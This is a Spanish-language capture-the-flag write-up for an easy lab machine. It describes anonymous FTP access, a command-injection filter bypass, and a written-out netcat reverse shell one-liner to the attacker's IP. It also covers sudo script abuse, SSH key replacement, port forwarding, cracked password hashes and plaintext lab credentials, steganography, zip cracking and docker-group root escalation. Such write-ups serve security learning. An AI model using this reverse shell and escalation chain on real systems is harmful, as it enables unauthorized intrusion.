
# Descripción

Easy level CTF.  Capture the flags and have fun!

# Reconocimiento

![[Pasted image 20240402181021.png]]

Realizando un escaneo de puertos, podemos observar un servicio ftp, ssh y servidor http en el puerto 80. Comenzare comprobando la web y sus recursos.

![[Pasted image 20240402181258.png]]

Volviendo al escaneo podíamos ver que es posible entrar en el ftp con las credenciales anonymous:anonymous 

![[Pasted image 20240402183756.png]]

Veremos dentro del directorio un archivo llamado note.txt y lo descargaremos

![[Pasted image 20240402184007.png]]

![[Pasted image 20240402184202.png]]

Vemos un usuario potencial llamado apaar, intentaremos usar fuzzing en la web para encontrar directorios

![[Pasted image 20240402185240.png]]

Encontramos el directorio secret y podemos ver que tenemos permiso de ejecución de comandos, desde el usuario www-data

![[Pasted image 20240402185337.png]]

ahora veremos los privilegios a nivel de sistema con sudo -l , podemos ver que hay un scripte en bash llamado .helpline.sh y no requiere autenticación para ejecutar, probaremos ejecutarlo

![[Pasted image 20240402185625.png]]

![[Pasted image 20240402185841.png]]

No se puede apreciar nada destacable en el codigo fuente la función y no permite utilizar el comando ls, comentando el caracter de la siguiente forma l\\s podremos ser capaz de bypassear el filtro, he utilizado un bypass en la inyección de comandos sacadas de este repositorio:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

![[Pasted image 20240402190351.png]]

Intentaremos hacer una reverse shell y ponernos en escucha con el netcat desde la maquina victima en el puerto 

Haciendo uso del siguiente script sacado de revshells, y pasando el filtro de comandos, utilizaremos `r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.74.176 4444 >/tmp/f
para establecer una conexión entre la maquina victima y la atacante por el puerto 4444

![[Pasted image 20240402190715.png]]

![[Pasted image 20240402190737.png]]

Obteniendo de esta manera acceso a la maquina victima dentro, haremos un tratamiento de la tty y ejecutaremos el script helpline desde el usuario apaar

`sudo -u apaar /home/apaar/.helpline.sh

Nos preguntara con quieren queremos hablar, da igual ese input, lo importante es que nos deja añadir un mensaje, dentro del mensaje añadiremos `/bin/bash` para hacer spawn de un shell desde el usuario apaar

![[Pasted image 20240402192214.png]]

Ahora somos capaces de ver la bandera, dentro de directorio home, tambien podemos ver un directorio ssh, con las claves del usuario apaar

![[Pasted image 20240402192505.png]]

Deberíamos poder cambiar nuestra credenciales ssh por las del usuario apaar para poder ingresar desde ssh, para eso generaremos nuestro propio par de claves que posteriormente utilizaremos para ingresar desde nuestra maquina atacante


Utilizaremos `ssh-keygen -t rsa` para generar un par de claves, y copiaremos la clave publica en el lugar de la autorizhed key para ingresar via ssh

![[Pasted image 20240402194427.png]]
![[Pasted image 20240402194608.png]]


Cambiaremos el rsa publico de apaar por el nuestro para logar una mejor conexión utilizando el comando echo

![[Pasted image 20240402194701.png]]

Mediante el comando `ssh -i id_rsa apaar@10.10.115.208` nos conectaremos usando las credenciales

Le daremos permisos chmod 400 al id_rsa y lograremos entrar al usuario apaar

![[Pasted image 20240402194945.png]]

Primero veamos las conexiones e interfaces de red de la maquina 

![[Pasted image 20240402195331.png]]

Podemos ver los puertos abiertos en local host 3306 de un servidor sql y el puerto 9001.

Indagando sobre el puerto 9001 podemos ver que efectivamente es un http, y un panel de autenticación con un llamado curl 

![[Pasted image 20240402195617.png]]

Por lo que posiblemente haya que desviar el trafico de la maquina victima a la nuestra para poder acceder al panel de autenticación, aunque no tenemos contraseñas, indaguemos dentro de la web para ver si hay un mal uso de reiteración de contraseñas o algo similar, veremos dentro del directorio /var/www/

![[Pasted image 20240402195119.png]]

Dentro del archivo index.php podemos ver como se hace una conexión directa a la base de datos con las credenciales en texto plano

![[Pasted image 20240402200000.png]]

Usuario: root
Contraseña: !@m+her00+@db

Realizaremos una conexión local a la base de datos para verificar si las credenciales son validas con el usuario root y efectivamente comprobamos que son validas, veamos las bases de datos y sus tablas en busca de usuarios o datos relevantes 

![[Pasted image 20240402200524.png]]

Buscamos dentro de las bases de datos, encontramos webportal, y dentro un tabla llamada users, podriamos ver si este usuario existe a nive de sistema y si a reutilizado las contraseña. 

![[Pasted image 20240402200716.png]]
1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd 
2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649

copiamos los hashes, y verificaremos en crackstation, o podríamos crackearlos, en crackstation obtenemos la contraseña de anurodh

![[Pasted image 20240402200939.png]]
masterpassword

y la contraseña de apaar 

![[Pasted image 20240402201015.png]]
dontaskdonttell

veremos los usuarios que existen a nivel de sistema, intentaremos conectarnos con las credenciales que nos han dado.

![[Pasted image 20240402201127.png]]

Haremos un portfortwarding con ssh, a la web que vimos previamente con curl de la siguiente forma `ssh -L 9001:127.0.0.1:9001 -i id_rsa apaar@10.10.115.208` y conseguimos el portforward accendiendo a localhost:9001

![[Pasted image 20240402202043.png]]

Ninguna credencial anterior funciona, podríamos hacer un ataque de fuerza bruta, o intentar sqli, pero nada da resultados, encontramos una pagina llamada hacker.php

![[Pasted image 20240402202456.png]]

![[Pasted image 20240402202535.png]]

Vemos que lo único que ofrece esta pagina es una imagen, intentemos descargar la imagen en nuestro kali

![[Pasted image 20240402202819.png]]

Intente probar si era capaz de ver metadata o algo similar y utilizando steghide fui capaz de identificar un archivo anexado a la imagen llamado backup.zip con un archivo llamado source_code.php

`steghide extract -sf hacker-with-laptop_23-2147985341.jpg`
![[Pasted image 20240402203258.png]]

Intentaremos crackear la contraseña con zip2john, y ver si es posible encontrar las credenciales correctas 
zip2john backup.zip > hash

![[Pasted image 20240402203436.png]]
![[Pasted image 20240402203753.png]]

Encontramos la contraseña para poder descomprimir el archivo, y veamos que tiene source_code.php

![[Pasted image 20240402203906.png]]

Volvemos a encontrar contraseñas, en base 64, convertiremos esto en string para poder verla en texto plano 

![[Pasted image 20240402205001.png]]

Ahora intentaremos conectarnos con el usuario Anurodh, utlizando las credenciales !d0ntKn0wmYp@ssw0rd

![[Pasted image 20240402204315.png]]

y efectivamente estamos dentro del usuario, podemos observar que tiene permisos 999 dentro de un docker, en una busquead por GTFObins

![[Pasted image 20240402204546.png]]

![[Pasted image 20240402204700.png]]

y obtenemos la bandera de root

![[Pasted image 20240402204830.png]]